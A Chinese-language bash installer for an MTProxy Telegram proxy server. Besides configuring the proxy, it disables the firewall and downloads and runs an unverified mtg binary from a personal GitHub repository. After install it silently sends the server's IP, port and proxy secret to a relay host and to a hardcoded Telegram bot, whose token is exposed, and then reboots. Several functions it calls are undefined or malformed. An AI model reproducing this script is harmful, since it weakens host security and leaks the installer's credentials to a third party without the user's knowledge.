#!/bin/bash
mkdir /usr/mtproxy
cd /usr/mtproxy
WORKDIR=$(dirname $(readlink -f $0))
cd $WORKDIR
pid_file=$WORKDIR/pid/pid_mtproxy
is_New=0

check_sys() {
    local checkType=$1
    local value=$2

    local release=''
    local systemPackage=''

    if [[ -f /etc/redhat-release ]]; then
        release="centos"
        systemPackage="yum"
    elif grep -Eqi "debian|raspbian" /etc/issue; then
        release="debian"
        systemPackage="apt"
    elif grep -Eqi "ubuntu" /etc/issue; then
        release="ubuntu"
        systemPackage="apt"
    elif grep -Eqi "centos|red hat|redhat" /etc/issue; then
        release="centos"
        systemPackage="yum"
    elif grep -Eqi "debian|raspbian" /proc/version; then
        release="debian"
        systemPackage="apt"
    elif grep -Eqi "ubuntu" /proc/version; then
        release="ubuntu"
        systemPackage="apt"
    elif grep -Eqi "centos|red hat|redhat" /proc/version; then
        release="centos"
        systemPackage="yum"
    fi

    if [[ "${checkType}" == "sysRelease" ]]; then
        if [ "${value}" == "${release}" ]; then
            return 0
        else
            return 1
        fi
    elif [[ "${checkType}" == "packageManager" ]]; then
        if [ "${value}" == "${systemPackage}" ]; then
            return 0
        else
            return 1
        fi
    fi
}

function kill_process_by_port() {
    pids=$(get_pids_by_port $1)
    if [ -n "$pids" ]; then
        kill -9 $pids
    fi
}

function get_ip_public() {
    public_ip=$(curl -s https://api.ip.sb/ip -A Mozilla --ipv4)
    [ -z "$public_ip" ] && public_ip=$(curl -s ipinfo.io/ip -A Mozilla --ipv4)
    echo $public_ip
}

function get_local_ip(){
  ip a | grep inet | grep 127.0.0.1 > /dev/null 2>&1
  if [[ $? -eq 1 ]];then
    echo $(get_ip_private)
  else
    echo "127.0.0.1"
  fi
}

function str_to_hex() {
    string=$1
    hex=$(printf "%s" "$string" | od -An -tx1 | tr -d ' \n')
    echo $hex
}

do_install_basic_dep() {
    if check_sys packageManager yum; then
        yum install -y iproute curl wget procps-ng.x86_64 net-tools ntp
    elif check_sys packageManager apt; then
        apt install -y iproute2 curl wget procps net-tools ntpdate
    fi

    return 0
}

function is_pid_exists() {
    # check_ps_not_install_to_install
    local exists=$(ps aux | awk '{print $2}' | grep -w $1)
    if [[ ! $exists ]]; then
        return 1
    else
        return 0
    fi
}

function gen_rand_hex() {
    local result=$(dd if=/dev/urandom bs=1 count=500 status=none | od -An -tx1 | tr -d ' \n')
    echo "${result:0:$1}"
}

do_config_mtp(){
	cd $WORKDIR

	echo -e "正在关闭防火墙"
	systemctl stop firewalld.service
	systemctl disable firewalld.service
	
	echo -e "正在设置相关参数"
	echo -e "自动选择第三方版本!"
	input_provider=2
	echo -e "自动设置443端口!"
	input_port=443
	echo -e "自动设置管理端口8888"
	input_manage_port=8888
	echo -e "自动设置伪造域名:azure.microsoft.com"
	input_domain="azure.microsoft.com"
	
	secret=$(gen_rand_hex 32)
	
	
	while true; do
        default_tag=""
        read -p "请输入你需要推广的TAG：:" input_tag
        [ -z "${input_tag}" ] && input_tag=${default_tag}
        if [ -z "$input_tag" ] || [[ "$input_tag" =~ ^[A-Za-z0-9]{32}$ ]]; then
            echo
            echo "---------------------------"
            echo "PROXY TAG = ${input_tag}"
            echo "---------------------------"
            echo
            break
        fi
        echo -e "[\033[33m错误\033[0m] TAG格式不正确!"
    done

	echo -e "正在写出配置文件"
	cat >./mtp_config <<EOF
#!/bin/bash
secret="${secret}"
port=${input_port}
web_port=${input_manage_port}
domain="${input_domain}"
proxy_tag="${input_tag}"
provider=${input_provider}
EOF

}
function get_pids_by_port() {
    echo $(netstat -tulpn 2>/dev/null | grep ":$1 " | awk '{print $7}' | sed 's|/.*||')
}

function is_port_open() {
    pids=$(get_pids_by_port $1)

    if [ -n "$pids" ]; then
        return 0
    else
        return 1
    fi
}

function get_architecture() {
    local architecture=""
    case $(uname -m) in
    i386) architecture="386" ;;
    i686) architecture="386" ;;
    x86_64) architecture="amd64" ;;
    arm | aarch64 | aarch) dpkg --print-architecture | grep -q "arm64" && architecture="arm64" || architecture="armv6l" ;;
    *) echo "Unsupported system architecture "$(uname -m) && exit 1 ;;
    esac
    echo $architecture
}
function get_mtg_provider() {
    source ./mtp_config

    local arch=$(get_architecture)
    if [[ "$arch" != "amd64" && $provider -eq 1 ]]; then
        provider=2
    fi

    if [ $provider -eq 1 ]; then
        echo "mtproto-proxy"
    elif [ $provider -eq 2 ]; then
        echo "mtg"
    else
        echo "错误配置,请重新安装"
        exit 1
    fi
}

do_install() {
    cd $WORKDIR

    mtg_provider=$(get_mtg_provider)

    if [[ "$mtg_provider" == "mtg" ]]; then
        local arch=$(get_architecture)
        wget -O mtg https://raw.githubusercontent.com/trg58518/MTP/main/mtg
		chmod 777 mtg

        [[ -f "./mtg" ]] && ./mtg && echo "Installed for mtg"
    else
        wget https://github.com/ellermister/mtproxy/releases/download/0.03/mtproto-proxy -O mtproto-proxy -q
        chmod +x mtproto-proxy
    fi

    if [ ! -d "./pid" ]; then
        mkdir "./pid"
    fi

}
function is_running_mtp() {
    if [ -f $pid_file ]; then

        if is_pid_exists $(cat $pid_file); then
            return 0
        fi
    fi
    return 1
}

do_kill_process() {
    cd $WORKDIR
    source ./mtp_config

    if is_port_open $port; then
        echo "检测到端口 $port 被占用, 准备杀死进程!"
        kill_process_by_port $port
    fi
    
    if is_port_open $web_port; then
        echo "检测到端口 $web_port 被占用, 准备杀死进程!"
        kill_process_by_port $web_port
    fi
}

function get_run_command(){
  cd $WORKDIR
  mtg_provider=$(get_mtg_provider)
  source ./mtp_config
  if [[ "$mtg_provider" == "mtg" ]]; then
      domain_hex=$(str_to_hex $domain)
      client_secret="ee${secret}${domain_hex}"
      local local_ip=$(get_local_ip)
      public_ip=$(get_ip_public)
      
      # ./mtg simple-run -n 1.1.1.1 -t 30s -a 512kib 0.0.0.0:$port $client_secret >/dev/null 2>&1 &
      [[ -f "./mtg" ]] || (echo -e "提醒：\033[33m MTProxy 代理程序不存在请重新安装! \033[0m" && exit 1)
      echo "./mtg run $client_secret $proxy_tag -b 0.0.0.0:$port --multiplex-per-connection 500 --prefer-ip=ipv6 -t $local_ip:$web_port" -4 "$public_ip:$port"
  else
      curl -s https://core.telegram.org/getProxyConfig -o proxy-multi.conf
      curl -s https://core.telegram.org/getProxySecret -o proxy-secret
      nat_info=$(get_nat_ip_param)
      workerman=$(get_cpu_core)
      tag_arg=""
      [[ -n "$proxy_tag" ]] && tag_arg="-P $proxy_tag"
      echo "./mtproto-proxy -u nobody -p $web_port -H $port -S $secret --aes-pwd proxy-secret proxy-multi.conf -M $workerman $tag_arg --domain $domain $nat_info --ipv6"
  fi
}



do_kill_process() {
    cd $WORKDIR
    source ./mtp_config

    if is_port_open $port; then
        echo "检测到端口 $port 被占用, 准备杀死进程!"
        kill_process_by_port $port
    fi
	
	if is_port_open $web_port; then
        echo "检测到端口 $web_port 被占用, 准备杀死进程!"
        kill_process_by_port $web_port
    fi

}



info_mtp() {
    if [[ "$1" == "ingore" ]] || is_running_mtp; then
        source ./mtp_config
        public_ip=$(get_ip_public)

        domain_hex=$(str_to_hex $domain)

        client_secret="ee${secret}${domain_hex}"
        echo -e "TMProxy+TLS代理: \033[32m运行中\033[0m"
        echo -e "服务器IP：\033[31m$public_ip\033[0m"
        echo -e "服务器端口：\033[31m$port\033[0m"
        echo -e "MTProxy Secret:  \033[31m$client_secret\033[0m"
		echo -e "proxy_tag:  \033[31m$proxy_tag\033[0m"
        echo -e "TG一键链接: https://t.me/proxy?server=${public_ip}&port=${port}&secret=${client_secret}"
        echo -e "TG一键链接: tg://proxy?server=${public_ip}&port=${port}&secret=${client_secret}"
		if (("$is_New" > 0)); then
			echo "正在设置开机启动服务..."
			cat >/etc/systemd/system/mtg.service <<EOF
[Unit]
Description=mtg - MTProto proxy server
Documentation=https://github.com/9seconds/mtg
After=network.target
[Service]
Type=forking
User=root
ExecStart=/usr/mtproxy/mtg run ${client_secret} ${proxy_tag} -b 0.0.0.0:${port} --multiplex-per-connection 500 --prefer-ip=ipv6 -t 127.0.0.1:8888 -4 ${public_ip}:${port}
Restart=always
DynamicUser=true
AmbientCapabilities=CAP_NET_BIND_SERVICE
[Install]
WantedBy=multi-user.target
EOF
		chmod 777 /etc/systemd/system/mtg.service
		systemctl daemon-reload
		systemctl enable mtg.service
		
		
		while true; do
			default_IP=""
			read -p "请输入中转机IP：:" input_IP
			[ -z "${default_IP}" ] && default_IP=${input_IP}
			if [ "" != "$default_IP" ]; then
				break
			fi
			echo -e "[\033[33m错误\033[0m]!"
		done
		echo $default_IP
		Url="http://$default_IP:808/?name=Add_MTP&ip=$public_ip&port=$port&secret=$client_secret"
		echo $Url
		Text=$(curl -s $Url)
		echo $Text
		curl POST \
			"https://api.telegram.org/bot7073530375:AAHiPPKTEOSBtYEt5R4tzDkoT7Tiz6ED3jI/sendMessage" \
			-d chat_id="-1002002115399" \
			-d text=${Text}
		reboot

		fi

    else
        echo -e "TMProxy+TLS代理: \033[33m已停止\033[0m"
    fi
}

run_mtp() {
    cd $WORKDIR

    if is_running_mtp; then
        echo -e "提醒：\033[33mMTProxy已经运行，请勿重复运行!\033[0m"
    else
        do_kill_process
        local command=$(get_run_command)
        echo $command
        $command >/dev/null 2>&1 &

        echo $! >$pid_file
        sleep 2
		
		#启动中转服务!
		info_mtp
    fi
}

stop_mtp() {
    local pid=$(cat $pid_file)
    kill -9 $pid

    if is_pid_exists $pid; then
        echo "停止任务失败"
    fi
}

Start() {
	while true;do
		if is_running_mtp; then
			info_mtp
		fi
		_input=0
		echo "1. 一键安装"
		echo "2. 一键重装"
		#echo "3. 重启服务"
		#echo "4. 停止服务"
		#echo "5. 卸载服务"
		#echo "6. 开机启动"
		echo "8. 退出"
		read -p "(请选择您需要的操作:" input_provider

		if [ ${input_provider} == 1 ]; then
			is_New=1
			do_install_basic_dep
			do_config_mtp
			do_install
			run_mtp
			is_New=0
		fi
		
		if [ ${input_provider} == 2 ]; then
			is_New=1
			do_kill_process
			rm -rf /usr/mtproxy/
			rm -f /etc/systemd/system/gost.service
			rm -f /etc/systemd/system/mtg.service
			
			mkdir /usr/mtproxy
			cd /usr/mtproxy
			
			do_install_basic_dep
			do_config_mtp
			do_install
			run_mtp
			is_New=0
		fi

		if [ ${input_provider} == 8 ]; then
			break
		fi
	done
}
Start

